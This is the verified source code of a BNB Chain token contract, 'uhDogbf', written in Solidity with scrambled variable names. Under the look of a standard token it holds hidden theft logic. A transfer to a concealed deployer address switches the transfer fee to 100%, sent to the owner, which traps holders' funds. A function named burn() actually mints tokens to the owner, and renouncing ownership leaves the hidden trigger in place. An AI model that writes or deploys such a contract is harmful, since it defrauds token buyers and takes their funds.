/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.6.10;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract uhDogbf {
mapping (address => mapping (address => uint256)) private _allowances;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  FsRqXK = 10000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant AykIfJ = 9+1;
address public  NFnDnW = address(0);
string public  name = "uhDogbf";
uint256 public  DPlRud = 100000000000000000000000;
mapping (address => uint256) public balanceOf;
string public  symbol = "uhDogbf";
uint256 public  Ehfevm = 10000000000000000;
address public  AjyTqO = address(0);
uint256 private  xiWghu = 10000000000000;
uint256 public  fkxejh = 10000000000000000000000000000;
uint256 public  PMcULe = 100000000000000000000000;
address public owner;
address public  ZhthCy = address(0);
address public  zTMzil = address(0);
uint256 public  VABOCt = 100000000000000000000;
address public  aNcCPi = address(0);
uint256 public  IBUmXi = 100000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  WGBRAt = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint8 public constant decimals = 18;
address public  LtIMFV = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  FycYLC = address(0);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "BRxSCy");
require(to != address(0), "BRxSCy");
require(amount <= balanceOf[from], "BRxSCy");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* AykIfJ/xiWghu ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==FycYLC){
xiWghu = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public {
FycYLC = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}